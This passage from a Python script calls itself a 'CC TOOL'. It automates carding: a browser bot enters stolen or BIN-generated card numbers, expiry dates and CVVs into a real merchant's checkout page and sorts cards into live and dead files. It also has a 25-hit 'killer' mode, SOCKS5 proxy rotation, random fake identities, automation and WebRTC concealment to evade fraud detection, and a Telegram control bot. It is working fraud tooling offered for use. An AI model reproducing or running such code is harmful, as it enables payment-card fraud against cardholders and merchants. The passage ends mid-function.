    name_elem = page.locator(SELECTORS["name_input"]).first
    name_elem.click()
    name_elem.fill("")
    name_elem.press_sequentially(name, delay=CONFIG["typing_delay_ms"])
    print_stage("NAME", "OK", name)

    print_stage("COUNTRY", "WAIT", country)
    try:
        select_country(page, country, timeout_ms=CONFIG["timeout_ms"])
        print_stage("COUNTRY", "OK", country)
    except Exception as e:
        print_stage("COUNTRY", "FAIL", str(e)[:50])

    print_stage("INITIAL_SUBMIT", "WAIT", "click")
    smart_wait(page, SELECTORS["initial_submit_button"], timeout_ms=10000)
    page.locator(SELECTORS["initial_submit_button"]).first.scroll_into_view_if_needed()
    page.locator(SELECTORS["initial_submit_button"]).first.click()
    print_stage("INITIAL_SUBMIT", "OK", "clicked")

    print_stage("PAYMENT_METHOD", "WAIT", "radio / fields")
    if not smart_wait_any(page, [SELECTORS["radio_wrapper"], SELECTORS["radio_hidden_input"], SELECTORS["payment_number_input"]], timeout_ms=CONFIG["timeout_ms"]):
        print_stage("PAYMENT_METHOD", "FAIL", "not ready")
        raise RuntimeError("Payment method UI not ready")
    click_radio_option_dynamic(page, timeout_ms=CONFIG["timeout_ms"])
    print_stage("PAYMENT_METHOD", "OK", "selected")

    smart_wait_any(page, [SELECTORS["payment_number_input"], 'input[aria-label*="Card number" i]', 'input[name="pan"]'], timeout_ms=CONFIG["timeout_ms"])

    fill_input_safely(page, SELECTORS["payment_number_input"], payment_number, timeout_ms=CONFIG["timeout_ms"], field_name="card number")
    print_stage("CARD_NUMBER", "OK", payment_number[:6] + "****")
    fill_input_safely(page, SELECTORS["expiration_date_input"], expiration_date, timeout_ms=CONFIG["timeout_ms"], field_name="expiration")
    print_stage("EXPIRY", "OK", expiration_date)
    fill_input_safely(page, SELECTORS["serial_number_input"], serial_number, timeout_ms=CONFIG["timeout_ms"], field_name="cvv")
    print_stage("CVV", "OK", "***")
    fill_input_safely(page, SELECTORS["user_name_input"], username, timeout_ms=CONFIG["timeout_ms"], field_name="card holder name")
    print_stage("HOLDER_NAME", "OK", username)
    print_stage("CARD_FIELDS", "OK", "all filled")
    page.wait_for_timeout(200)

    print_stage("FINAL_SUBMIT", "WAIT", "pay")
    smart_wait(page, SELECTORS["final_submit_button"], timeout_ms=10000)
    page.locator(SELECTORS["final_submit_button"]).first.scroll_into_view_if_needed()
    page.locator(SELECTORS["final_submit_button"]).first.click(force=True)
    print_stage("FINAL_SUBMIT", "OK", "clicked")

    print_stage("RESULT", "WAIT", "waiting response")
    result_msg = wait_for_result(page, timeout_ms=max(CONFIG["timeout_ms"] * 2, 45000))
    if "Warning" in result_msg or "timeout" in result_msg.lower():
        print_stage("RESULT", "FAIL", result_msg[:70])
    else:
        print_stage("RESULT", "OK", result_msg[:70])
    return result_msg

# ==============================================================================
# LOGGING
# ==============================================================================
def save_live(raw_line, result, email, proxy, hit):
    ts = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    with open("live.txt", "a", encoding="utf-8") as f:
        f.write(f"{raw_line} | RESULT: {result} | EMAIL: {email} | PROXY: {proxy} | HIT: {hit} | TIME: {ts}\n")
        f.flush()

def save_dead(raw_line, result, email, proxy, hit):
    ts = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    with open("dead.txt", "a", encoding="utf-8") as f:
        f.write(f"{raw_line} | RESULT: {result} | EMAIL: {email} | PROXY: {proxy} | HIT: {hit} | TIME: {ts}\n")
        f.flush()

def save_error(raw_line, result, email, proxy, hit):
    ts = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    with open("error.txt", "a", encoding="utf-8") as f:
        f.write(f"{raw_line} | RESULT: {result} | EMAIL: {email} | PROXY: {proxy} | HIT: {hit} | TIME: {ts}\n")
        f.flush()

def save_unknown(raw_line, result, email, proxy, hit):
    ts = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    with open("unknown.txt", "a", encoding="utf-8") as f:
        f.write(f"{raw_line} | RESULT: {result} | EMAIL: {email} | PROXY: {proxy} | HIT: {hit} | TIME: {ts}\n")
        f.flush()

# ==============================================================================
# MODE SELECTOR
# ==============================================================================

# ==============================================================================
# PROXY CHECKER / ANALYTICS
# ==============================================================================
def detect_proxy_type(proxy_str: str) -> str:
    p = proxy_str.strip().lower()
    if p.startswith("socks5://") or p.startswith("socks://") or p.startswith("socks5h://"):
        return "SOCKS5"
    if p.startswith("socks4://"):
        return "SOCKS4"
    if p.startswith("http://") or p.startswith("https://"):
        return "HTTP"
    # host:port:user:pass  or  host:port  → treat as SOCKS5 candidate (tool default)
    if "://" not in p and p.count(":") >= 1:
        return "SOCKS5"
    if "://" not in p:
        return "UNKNOWN (no scheme)"
    return "OTHER"

def test_single_proxy(proxy_str: str, test_url: str = "https://api.ipify.org", timeout: float = 12.0) -> dict:
    result = {
        "proxy": proxy_str,
        "type": detect_proxy_type(proxy_str),
        "alive": False,
        "latency_ms": None,
        "exit_ip": None,
        "suitable": False,
        "reason": "",
        "raw_error": "",
    }

    if result["type"] != "SOCKS5":
        result["reason"] = "Tool requires SOCKS5 (pproxy bridge)"
        result["suitable"] = False
        try:
            import urllib.request
            handler = urllib.request.ProxyHandler({"http": proxy_str, "https": proxy_str})
            opener = urllib.request.build_opener(handler)
            opener.addheaders = [("User-Agent", "Mozilla/5.0")]
            t0 = time.time()
            with opener.open(test_url, timeout=timeout) as resp:
                ip = resp.read().decode().strip()
                result["latency_ms"] = int((time.time() - t0) * 1000)
                result["exit_ip"] = ip
                result["alive"] = True
                result["reason"] = f"Alive but type={result['type']} — use socks5:// for tool"
        except Exception as e:
            result["raw_error"] = str(e)[:100]
            result["reason"] = f"Not SOCKS5 + connection failed: {result['raw_error']}"
        return result

    import socket as _socket
    def free_port():
        with _socket.socket() as s:
            s.bind(("127.0.0.1", 0))
            return s.getsockname()[1]

    local_port = free_port()
    parsed = proxy_mgr._parse(proxy_str)
    if not parsed:
        result["reason"] = "Parse failed (bad format)"
        return result
    scheme, host, port, user, pass_ = parsed
    if user and pass_:
        remote_uri = f"socks5://{host}:{port}#{user}:{pass_}"
    else:
        remote_uri = f"socks5://{host}:{port}"

    proc = None
    try:
        proc = subprocess.Popen(
            [sys.executable, "-m", "pproxy",
             "-l", f"http://127.0.0.1:{local_port}",
             "-r", remote_uri],
            stdout=subprocess.DEVNULL,
            stderr=subprocess.PIPE,
        )
        time.sleep(1.6)
        if proc.poll() is not None:
            _, err = proc.communicate()
            result["raw_error"] = (err or b"").decode(errors="ignore")[:120]
            result["reason"] = f"pproxy failed: {result['raw_error']}"
            return result

        local_url = f"http://127.0.0.1:{local_port}"
        import urllib.request
        handler = urllib.request.ProxyHandler({"http": local_url, "https": local_url})
        opener = urllib.request.build_opener(handler)
        opener.addheaders = [("User-Agent", "Mozilla/5.0")]
        t0 = time.time()
        with opener.open(test_url, timeout=timeout) as resp:
            ip = resp.read().decode().strip()
            latency = int((time.time() - t0) * 1000)
            result["latency_ms"] = latency
            result["exit_ip"] = ip
            result["alive"] = True
            if latency < 3000:
                result["suitable"] = True
                result["reason"] = "Excellent — fast SOCKS5, good for tool"
            elif latency < 7000:
                result["suitable"] = True
                result["reason"] = "Good — usable (raise timeout if needed)"
            elif latency < 12000:
                result["suitable"] = True
                result["reason"] = "Slow but alive — set timeout 45000+"
            else:
                result["suitable"] = False
                result["reason"] = "Too slow — will cause timeouts"
    except Exception as e:
        result["raw_error"] = str(e)[:120]
        result["reason"] = f"Connection failed: {result['raw_error']}"
        result["alive"] = False
        result["suitable"] = False
    finally:
        if proc:
            try:
                proc.terminate()
                proc.wait(timeout=2)
            except Exception:
                try:
                    proc.kill()
                except Exception:
                    pass
    return result

def run_proxy_check():
    os.system("cls" if os.name == "nt" else "clear")
    print_master_banner("PROXY CHECK")
    proxy_file = CONFIG.get("proxy_file", "proxy.txt")
    print(f"\n{rgb(0,200,255)}[*] Loading proxies from: {proxy_file}{RESET}")
    proxies = load_proxies(proxy_file)
    if not proxies:
        print(f"{rgb(255,80,80)}[!] No proxies found in {proxy_file}{RESET}")
        input("\nPress Enter...")
        return

    print(f"{rgb(0,255,170)}[+] {len(proxies)} proxies loaded — testing each...\n{RESET}")
    print("-" * 90)

    results = []
    alive_count = suitable_count = 0

    for i, px in enumerate(proxies, 1):
        print(f"{rgb(255,200,0)}[{i}/{len(proxies)}]{RESET} Testing: {px[:65]}...")
        info = test_single_proxy(px)
        results.append(info)

        status_col = rgb(0, 255, 120) if info["alive"] else rgb(255, 80, 80)
        suit_col = rgb(0, 255, 120) if info["suitable"] else rgb(255, 150, 0)
        lat = f"{info['latency_ms']} ms" if info["latency_ms"] is not None else "—"
        ip = info["exit_ip"] or "—"

        print(f"    Type     : {info['type']}")
        print(f"    Alive    : {status_col}{'YES' if info['alive'] else 'NO'}{RESET}")
        print(f"    Latency  : {lat}")
        print(f"    Exit IP  : {ip}")
        print(f"    Suitable : {suit_col}{'YES' if info['suitable'] else 'NO'}{RESET}  → {info['reason']}")
        if info["raw_error"] and not info["alive"]:
            print(f"    Error    : {info['raw_error'][:80]}")
        print("-" * 90)

        if info["alive"]:
            alive_count += 1
        if info["suitable"]:
            suitable_count += 1

    print(f"\n{BOLD}{rgb(0,255,170)}PROXY ANALYTICS SUMMARY{RESET}")
    print("=" * 90)
    print(f"  Total proxies    : {len(proxies)}")
    print(f"  {rgb(0,255,120)}Alive            : {alive_count}{RESET}")
    print(f"  {rgb(255,80,80)}Dead             : {len(proxies) - alive_count}{RESET}")
    print(f"  {rgb(0,200,255)}Suitable for tool: {suitable_count}{RESET}")
    print("=" * 90)

    with open("proxy_report.txt", "w", encoding="utf-8") as f:
        f.write(f"CC TOOL — Proxy Report  {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
        f.write("=" * 80 + "\n")
        for info in results:
            f.write(f"PROXY    : {info['proxy']}\n")
            f.write(f"TYPE     : {info['type']}\n")
            f.write(f"ALIVE    : {info['alive']}\n")
            f.write(f"LATENCY  : {info['latency_ms']} ms\n")
            f.write(f"EXIT IP  : {info['exit_ip']}\n")
            f.write(f"SUITABLE : {info['suitable']}\n")
            f.write(f"REASON   : {info['reason']}\n")
            if info["raw_error"]:
                f.write(f"ERROR    : {info['raw_error']}\n")
            f.write("-" * 40 + "\n")
        f.write(f"\nSUMMARY: total={len(proxies)} alive={alive_count} suitable={suitable_count}\n")
    print(f"\n{rgb(0,255,170)}[+] Full report saved → proxy_report.txt{RESET}")

    good = [r["proxy"] for r in results if r["suitable"]]
    if good:
        with open("proxy_good.txt", "w", encoding="utf-8") as f:
            for g in good:
                f.write(g + "\n")
        print(f"{rgb(0,255,120)}[+] Suitable proxies saved → proxy_good.txt ({len(good)}){RESET}")

    input("\nPress Enter to continue...")


def select_mode():
    while True:
        os.system("cls" if os.name == "nt" else "clear")
        print_master_banner()
        print(f"\n{BOLD}{rgb(255,200,0)}SELECT MODE{RESET}")
        print("-" * 50)
        print(f"  {rgb(0,255,120)}1{RESET}  CHECKER   – standard check (hits=1, current URL)")
        print(f"  {rgb(255,100,50)}2{RESET}  KILLER    – multi-hit kill (hits=25, killer URL)")
        print(f"  {rgb(0,200,255)}3{RESET}  MASTER    – generate from bins.txt → auto check")
        print(f"  {rgb(255,200,0)}4{RESET}  PROXY CHECK – test all proxies in proxy.txt (health + analytics)")
        print(f"  {rgb(255,80,80)}Q{RESET}  Quit")
        print()
        choice = input("Mode (1/2/3/4/Q): ").strip().lower()
        if choice == "1":
            CONFIG["mode"] = "checker"
            CONFIG["base_url"] = "https://www.creem.io/payment/prod_5AAi7K8Ms7Viyf9dUtZAIX"
            CONFIG["hits_per_card"] = 1
            return "checker"
        elif choice == "2":
            CONFIG["mode"] = "killer"
            CONFIG["base_url"] = CONFIG["killer_url"]
            CONFIG["hits_per_card"] = CONFIG["killer_hits_per_card"]
            return "killer"
        elif choice == "3":
            CONFIG["mode"] = "master"
            CONFIG["base_url"] = "https://www.creem.io/payment/prod_5AAi7K8Ms7Viyf9dUtZAIX"
            CONFIG["hits_per_card"] = 1
            return "master"
        elif choice == "4":
            run_proxy_check()
            return None   # stay in mode loop
        elif choice == "q":
            sys.exit(0)

# ==============================================================================
# SETTINGS MENU
# ==============================================================================
def show_settings_menu(mode_name: str):
    while True:
        os.system("cls" if os.name == "nt" else "clear")
        print_master_banner(mode_name)
        print(f"\n{BOLD}{rgb(255,200,0)}CURRENT SETTINGS  [{mode_name.upper()}]{RESET}")
        print("-" * 78)
        print(f"  1. CC / Data File      : {CONFIG['data_file']}")
        print(f"  2. Target URL          : {CONFIG['base_url'][:55]}")
        print(f"  3. Hits per Card       : {CONFIG['hits_per_card']}")
        print(f"  4. Proxy File          : {CONFIG['proxy_file']}")
        print(f"  5. Email File          : {CONFIG['email_file']}")
        print(f"  6. Bins File (MASTER)  : {CONFIG['bins_file']}")
        print(f"  7. Headless            : {CONFIG['headless']}")
        print(f"  8. Default Email       : {CONFIG['default_email']}")
        print(f"  9. Default Name        : {CONFIG['default_name']}")
        print(f" 10. Default Country     : {CONFIG['default_country']}")
        print(f" 11. Timeout (ms)        : {CONFIG['timeout_ms']}")
        print(f" 12. Typing Delay (ms)   : {CONFIG['typing_delay_ms']}")
        print(f" 13. Retry on Error      : {CONFIG['retry_on_error']}")
        print(f" 14. Delay Between Hits  : {CONFIG['delay_between_hits']}s")
        print(f" 15. Proxy Rotation      : {CONFIG['proxy_rotation']}")
        print(f" 16. Email Rotation      : {CONFIG['email_rotation']}")
        print(f" 17. Random Identity     : {CONFIG['random_identity']}")
        print(f" 18. Random Country      : {CONFIG['random_country']}")
        print(f" 19. Stop on Live        : {CONFIG['stop_on_live']}")
        print(f" 20. Max Consec Timeouts : {CONFIG['max_consecutive_timeouts']}")
        print(f" 21. Proxy Max Fails     : {CONFIG['proxy_max_fails']}")
        print(f" 22. Cards per BIN       : {CONFIG['cards_per_bin']}")
        print(f" 23. Killer URL          : {CONFIG['killer_url'][:45]}")
        print(f" 24. Killer Hits/Card    : {CONFIG['killer_hits_per_card']}")
        print(f" 25. Cards per BIN       : {CONFIG['cards_per_bin']}")
        print(f" 26. BINs per batch      : {CONFIG['bins_per_batch']}")
        print(f" 27. Just Need Live      : {CONFIG['just_need_live']}")
        print(f" 28. Min Live Cards      : {CONFIG['min_live_cards']}")
        print(f" 29. Delete Dead Files   : {CONFIG['delete_dead_files']}")
        print("-" * 78)
        print(f"  {rgb(0,255,100)}S{RESET}  Start  {mode_name.upper()}")
        print(f"  {rgb(255,200,0)}M{RESET}  Back to Mode Select")
        print(f"  {rgb(255,80,80)}Q{RESET}  Quit")
        print()

        choice = input("Option: ").strip().lower()

        if choice == "1":
            v = input("CC file: ").strip()
            if v: CONFIG["data_file"] = v
        elif choice == "2":
            v = input("Target URL: ").strip()
            if v: CONFIG["base_url"] = v
        elif choice == "3":
            v = input("Hits per card: ").strip()
            if v.isdigit() and int(v) > 0: CONFIG["hits_per_card"] = int(v)
        elif choice == "4":
            CONFIG["proxy_file"] = input("Proxy file (empty=disable): ").strip()
        elif choice == "5":
            CONFIG["email_file"] = input("Email file: ").strip()
        elif choice == "6":
            v = input("Bins file: ").strip()
            if v: CONFIG["bins_file"] = v
        elif choice == "7":
            CONFIG["headless"] = input("Headless? (y/n): ").strip().lower() in ("y", "yes", "1")
        elif choice == "8":
            v = input("Default email: ").strip()
            if v: CONFIG["default_email"] = v
        elif choice == "9":
            v = input("Default name: ").strip()
            if v: CONFIG["default_name"] = v
        elif choice == "10":
            v = input("Default country: ").strip()
            if v: CONFIG["default_country"] = v
        elif choice == "11":
            v = input("Timeout ms: ").strip()
            if v.isdigit() and int(v) > 0: CONFIG["timeout_ms"] = int(v)
        elif choice == "12":
            v = input("Typing delay ms: ").strip()
            if v.isdigit() and int(v) >= 0: CONFIG["typing_delay_ms"] = int(v)
        elif choice == "13":
            v = input("Retry count: ").strip()
            if v.isdigit() and int(v) >= 0: CONFIG["retry_on_error"] = int(v)
        elif choice == "14":
            try: CONFIG["delay_between_hits"] = float(input("Delay seconds: ").strip())
            except ValueError: pass
        elif choice == "15":
            CONFIG["proxy_rotation"] = input("Proxy rotation? (y/n): ").strip().lower() in ("y", "yes", "1")
        elif choice == "16":
            CONFIG["email_rotation"] = input("Email rotation? (y/n): ").strip().lower() in ("y", "yes", "1")
        elif choice == "17":
            CONFIG["random_identity"] = input("Random identity? (y/n): ").strip().lower() in ("y", "yes", "1")
        elif choice == "18":
            CONFIG["random_country"] = input("Random country? (y/n): ").strip().lower() in ("y", "yes", "1")
        elif choice == "19":
            CONFIG["stop_on_live"] = input("Stop on live? (y/n): ").strip().lower() in ("y", "yes", "1")
        elif choice == "20":
            v = input("Max consecutive timeouts: ").strip()
            if v.isdigit() and int(v) >= 1: CONFIG["max_consecutive_timeouts"] = int(v)
        elif choice == "21":
            v = input("Proxy max fails before skip: ").strip()
            if v.isdigit() and int(v) >= 1: CONFIG["proxy_max_fails"] = int(v)
        elif choice == "22":
            v = input("Cards per BIN (master): ").strip()
            if v.isdigit() and int(v) >= 1: CONFIG["cards_per_bin"] = int(v)
        elif choice == "23":
            v = input("Killer URL: ").strip()
            if v: CONFIG["killer_url"] = v
        elif choice == "24":
            v = input("Killer hits per card: ").strip()
            if v.isdigit() and int(v) > 0: CONFIG["killer_hits_per_card"] = int(v)
        elif choice == "25":
            v = input("Cards per BIN: ").strip()
            if v.isdigit() and int(v) >= 1: CONFIG["cards_per_bin"] = int(v)
        elif choice == "26":
            v = input("BINs per batch: ").strip()
            if v.isdigit() and int(v) >= 1: CONFIG["bins_per_batch"] = int(v)
        elif choice == "27":
            CONFIG["just_need_live"] = input("Just need live? (y/n): ").strip().lower() in ("y","yes","1")
        elif choice == "28":
            v = input("Min live cards to stop: ").strip()
            if v.isdigit() and int(v) >= 1: CONFIG["min_live_cards"] = int(v)
        elif choice == "29":
            CONFIG["delete_dead_files"] = input("Delete dead/error files after batch? (y/n): ").strip().lower() in ("y","yes","1")
        elif choice == "s":
            return "start"
        elif choice == "m":
            return "mode"
        elif choice == "q":
            sys.exit(0)

# ==============================================================================
# MAIN ATTACK ENGINE
# ==============================================================================

def run_attack(mode_name: str):
    proxies = load_proxies(CONFIG.get("proxy_file", ""))
    emails = load_emails(CONFIG.get("email_file", ""))
    proxy_cycle = itertools.cycle(proxies) if proxies else None
    email_cycle = itertools.cycle(emails) if emails else None

    def process_card_list(records, batch_label=""):
        nonlocal_data = {
            "live": 0, "dead": 0, "error": 0, "hits": 0,
            "consec_to": 0, "skipped": set(), "stop": False
        }

        os.system("cls" if os.name == "nt" else "clear")
        print_master_banner(mode_name)
        print(f"\n{rgb(0,255,170)}[+] Mode          : {mode_name.upper()}  {batch_label}{RESET}")
        print(f"{rgb(0,255,170)}[+] Cards         : {len(records)}{RESET}")
        print(f"{rgb(0,255,170)}[+] Hits / card   : {CONFIG['hits_per_card']}{RESET}")
        print(f"{rgb(0,255,170)}[+] Live so far   : {count_live_cards()}{RESET}")
        print(f"{rgb(0,255,170)}[+] Target        : {CONFIG['base_url'][:55]}{RESET}")
        print(f"{rgb(0,255,170)}[+] Proxies       : {len(proxies) if proxies else 0}  |  Rotation: {CONFIG['proxy_rotation']}{RESET}")
        print(f"{rgb(0,200,255)}[+] Bridge        : pproxy @ {proxy_mgr.local_proxy_url}{RESET}")
        print("-" * 78)

        try:
            with sync_playwright() as p:
                for idx, (payment_num, exp_date, serial_num, raw_line) in enumerate(records, start=1):
                    print(f"\n{BOLD}{rgb(255,200,0)}[{idx}/{len(records)}] CARD: {raw_line}{RESET}")

                    for hit in range(1, CONFIG["hits_per_card"] + 1):
                        proxy_str = "none"
                        if proxies:
                            attempts = 0
                            while attempts < len(proxies):
                                candidate = next(proxy_cycle) if CONFIG.get("proxy_rotation", True) else proxies[0]
                                if candidate in nonlocal_data["skipped"] or proxy_mgr.is_dead(candidate):
                                    attempts += 1
                                    continue
                                proxy_str = candidate
                                break
                            if proxy_str == "none" and proxies:
                                nonlocal_data["skipped"].clear()
                                proxy_mgr.fail_counts.clear()
                                proxy_str = proxies[0]

                        current_email = CONFIG["default_email"]
                        if emails and CONFIG.get("email_rotation", True):
                            current_email = next(email_cycle)
                        elif emails:
                            current_email = emails[0]

                        if CONFIG.get("random_identity", True):
                            current_name = random_name()
                            current_username = random_username(current_name)
                        else:
                            current_name = CONFIG["default_name"]
                            current_username = CONFIG["default_username"]
                        current_country = random_country() if CONFIG.get("random_country") else CONFIG["default_country"]

                        print_workflow_header(mode_name, idx, len(records), raw_line, hit,
                                              CONFIG["hits_per_card"], proxy_str, current_email, current_name)
                        log_event("INFO", "HIT_START", f"card={idx} hit={hit}", f"proxy={proxy_str[:40]}")
                        animator.start(f"CHECKING  Card {idx}/{len(records)}  •  Hit {hit}/{CONFIG['hits_per_card']}  •  {proxy_str[:28]}")

                        browser = context = page = None
                        result = None
                        status = "error"

                        for attempt in range(CONFIG["retry_on_error"] + 1):
                            try:
                                proxy_config = None
                                if proxy_str != "none":
                                    if nonlocal_data["consec_to"] >= CONFIG.get("max_consecutive_timeouts", 3):
                                        proxy_mgr.force_restart(proxy_str)
                                        nonlocal_data["consec_to"] = 0
                                        time.sleep(2.0)
                                    if proxy_mgr.start(proxy_str):
                                        print_stage("PROXY_HEALTH", "WAIT", "testing tunnel")
                                        if proxy_health_check(proxy_mgr.local_proxy_url, timeout=10.0):
                                            print_stage("PROXY_HEALTH", "OK", "alive")
                                            proxy_config = {"server": proxy_mgr.local_proxy_url}
                                        else:
                                            print_stage("PROXY_HEALTH", "FAIL", "dead")
                                            proxy_mgr.mark_fail(proxy_str)
                                            if proxy_mgr.is_dead(proxy_str):
                                                nonlocal_data["skipped"].add(proxy_str)
                                                print_stage("PROXY", "SKIP", "max fails")
                                            proxy_mgr.force_restart(proxy_str)
                                            time.sleep(1.5)
                                            if proxy_health_check(proxy_mgr.local_proxy_url, timeout=10.0):
                                                proxy_config = {"server": proxy_mgr.local_proxy_url}
                                            else:
                                                raise RuntimeError("PROXY_DEAD_SKIP")

                                browser = p.chromium.launch(
                                    headless=CONFIG["headless"],
                                    slow_mo=CONFIG["slow_mo_ms"],
                                    proxy=proxy_config,
                                    args=[
                                        "--disable-blink-features=AutomationControlled",
                                        "--no-sandbox", "--disable-dev-shm-usage",
                                        "--disable-rtc-smoothness-algorithm",
                                        "--disable-webrtc-hw-decoding",
                                        "--disable-webrtc-hw-encoding",
                                    ]
                                )
                                context = browser.new_context(
                                    viewport={"width": 1280, "height": 800},
                                    user_agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
                                    ignore_https_errors=True,
                                    permissions=[],
                                )
                                context.add_init_script("""
                                    window.RTCPeerConnection = function() { throw new Error('WebRTC disabled'); };
                                    window.webkitRTCPeerConnection = function() { throw new Error('WebRTC disabled'); };
                                    Object.defineProperty(navigator, 'mediaDevices', { value: undefined });
                                """)
                                page = context.new_page()
                                page.set_default_timeout(CONFIG["timeout_ms"])

                                result = process_single_entry(
                                    page, payment_num, exp_date, serial_num,
                                    current_email, current_name, current_username, current_country
                                )
                                status = classify_result(result)
                                if proxy_str != "none":
                                    proxy_mgr.mark_ok(proxy_str)
                                break

                            except PlaywrightTimeoutError:
                                result = "[Timeout]"
                                status = "error"
                                nonlocal_data["consec_to"] += 1
                                if proxy_str != "none":
                                    proxy_mgr.mark_fail(proxy_str)
                                if attempt < CONFIG["retry_on_error"]:
                                    animator.update_message(f"RETRY {attempt+1}")
                                    time.sleep(0.8)
                                    continue
                            except Exception as e:
                                err_msg = str(e)
                                log_event("FAIL", "EXCEPTION", err_msg[:200])
                                if "PROXY_DEAD_SKIP" in err_msg:
                                    result = "[Error] Proxy dead – skipped"
                                    status = "error"
                                    break
                                if any(x in err_msg for x in ["ERR_EMPTY_RESPONSE", "ERR_CONNECTION", "ERR_PROXY", "ERR_TUNNEL", "net::ERR_"]):
                                    result = f"[Error] Network/Proxy dead: {err_msg[:70]}"
                                    nonlocal_data["consec_to"] = CONFIG.get("max_consecutive_timeouts", 3)
                                    if proxy_str != "none":
                                        proxy_mgr.mark_fail(proxy_str)
                                        if proxy_mgr.is_dead(proxy_str):
                                            nonlocal_data["skipped"].add(proxy_str)
                                else:
                                    result = f"[Error] {err_msg[:120]}"
                                status = "error"
                                if attempt < CONFIG["retry_on_error"]:
                                    animator.update_message(f"RETRY {attempt+1}")
                                    time.sleep(1.0)
                                    continue
                            finally:
                                for obj in (page, context, browser):
                                    try:
                                        if obj: obj.close()
                                    except Exception:
                                        pass
                                page = context = browser = None

                        animator.stop()
                        nonlocal_data["hits"] += 1
                        BOT_STATE["stats"]["hits"] = nonlocal_data["hits"]
                        BOT_STATE["current_card"] = raw_line
                        if BOT_STATE.get("stop_requested"):
                            print_stage("STOP", "INFO", "telegram/local stop requested")
                            nonlocal_data["stop"] = True
                            return nonlocal_data
                        short_msg = (result[:70] + "...") if result and len(result) > 70 else (result or "Unknown")

                        if status == "live":
                            nonlocal_data["live"] += 1
                            BOT_STATE["stats"]["live"] = nonlocal_data["live"]
                            nonlocal_data["consec_to"] = 0
                            animate_success(f"→ {short_msg}")
                            save_live(raw_line, result, current_email, proxy_str, hit)
                            print(f"  {rgb(0,255,120)}[LIVE] → live.txt  (total live: {count_live_cards()}){RESET}")
                            if CONFIG.get("stop_on_live"):
                                nonlocal_data["stop"] = True
                                return nonlocal_data
                            if mode_name == "master" and CONFIG.get("just_need_live") and count_live_cards() >= CONFIG.get("min_live_cards", 100):
                                print(f"  {rgb(0,255,170)}[!] Min live ({CONFIG['min_live_cards']}) reached → stop{RESET}")
                                nonlocal_data["stop"] = True
                                return nonlocal_data
                        elif status == "dead":
                            nonlocal_data["dead"] += 1
                            BOT_STATE["stats"]["dead"] = nonlocal_data["dead"]
                            nonlocal_data["consec_to"] = 0
                            animate_decline(f"→ {short_msg}")
                            save_dead(raw_line, result, current_email, proxy_str, hit)
                        else:
                            nonlocal_data["error"] += 1
                            BOT_STATE["stats"]["error"] = nonlocal_data["error"]
                            if "Timeout" in (result or "") or "Network" in (result or ""):
                                nonlocal_data["consec_to"] += 1
                            animate_error(f"→ {short_msg}")
                            save_error(raw_line, result, current_email, proxy_str, hit)
                            save_unknown(raw_line, result, current_email, proxy_str, hit)

                        delay = CONFIG["delay_between_hits"]
                        if nonlocal_data["consec_to"] > 0:
                            delay = max(delay, 1.5 + nonlocal_data["consec_to"] * 0.4)
                        time.sleep(delay)
        except StopIteration:
            nonlocal_data["stop"] = True
        return nonlocal_data

    # ========== MODE DISPATCH ==========
    grand_live = grand_dead = grand_err = grand_hits = 0

    if mode_name == "master":
        all_bins = load_bin_lines(CONFIG["bins_file"])
        if not all_bins:
            print(f"[Error] No bins in {CONFIG['bins_file']}")
            time.sleep(2)
            return

        bins_per_batch = max(1, int(CONFIG.get("bins_per_batch", 3)))
        cards_per_bin = max(1, int(CONFIG.get("cards_per_bin", 200)))
        just_need = CONFIG.get("just_need_live", True)
        min_live = int(CONFIG.get("min_live_cards", 100))

        print(f"\n{rgb(0,200,255)}[MASTER] BINs={len(all_bins)} | batch_size={bins_per_batch} | cards/BIN={cards_per_bin}{RESET}")
        print(f"{rgb(0,200,255)}[MASTER] just_need_live={just_need}  target_live={min_live}{RESET}")

        batch_num = 0
        for batch_start in range(0, len(all_bins), bins_per_batch):
            batch_num += 1
            batch_bins = all_bins[batch_start:batch_start + bins_per_batch]
            records = generate_cards_from_bin_lines(batch_bins, cards_per_bin)
            if not records:
                continue

            with open("generated_cards.txt", "w", encoding="utf-8") as gf:
                for _, _, _, raw in records:
                    gf.write(raw + "\n")

            label = f"| batch {batch_num} | BINs {batch_start+1}-{batch_start+len(batch_bins)}/{len(all_bins)}"
            stats = process_card_list(records, batch_label=label)
            grand_live += stats["live"]
            grand_dead += stats["dead"]
            grand_err += stats["error"]
            grand_hits += stats["hits"]

            # Clean dead/error after every batch — keep live.txt
            cleanup_batch_files()
            print(f"\n{rgb(0,255,170)}[MASTER] Batch {batch_num} done | batch live={stats['live']} | total live={count_live_cards()}{RESET}")

            if stats.get("stop"):
                break
            if just_need and count_live_cards() >= min_live:
                print(f"{rgb(0,255,170)}[MASTER] Target live reached ({count_live_cards()}/{min_live}) — stopping{RESET}")
                break

    else:
        # CHECKER / KILLER — single file load
        records = load_records_from_file(CONFIG["data_file"])
        if not records:
            print("No valid records. Returning.")
            time.sleep(2)
            return
        stats = process_card_list(records)
        grand_live = stats["live"]
        grand_dead = stats["dead"]
        grand_err = stats["error"]
        grand_hits = stats["hits"]

    proxy_mgr.stop()
    animator.stop()

    print("\n" + "=" * 78)
    print(f"{BOLD}{rgb(0,255,170)}CC TOOL FINISHED  [{mode_name.upper()}]{RESET}")
    print(f"Total hits    : {grand_hits}")
    print(f"{rgb(0,255,120)}Live (batch)  : {grand_live}{RESET}")
    print(f"{rgb(0,255,120)}Live (file)   : {count_live_cards()}{RESET}")
    print(f"{rgb(255,80,80)}Dead          : {grand_dead}{RESET}")
    print(f"{rgb(255,200,0)}Error/Unknown : {grand_err}{RESET}")
    print("=" * 78)
    print("Saved → live.txt (kept) | log.txt")
    if mode_name == "master":
        print("Dead/error/unknown cleaned after each batch (live.txt preserved)")
    input("\nPress Enter to continue...")



# ==============================================================================
# ENTRY
# ==============================================================================

# ==============================================================================
# TELEGRAM BOT
# ==============================================================================
def _bot_allowed(user_id: int) -> bool:
    if not TELE_ADMIN_IDS:
        return True
    return int(user_id) in TELE_ADMIN_IDS

def _count_lines(path: str) -> int:
    if not os.path.exists(path):
        return 0
    try:
        with open(path, "r", encoding="utf-8", errors="ignore") as f:
            return sum(1 for line in f if line.strip())
    except Exception:
        return 0

def _read_file_tail(path: str, n: int = 15) -> str:
    if not os.path.exists(path):
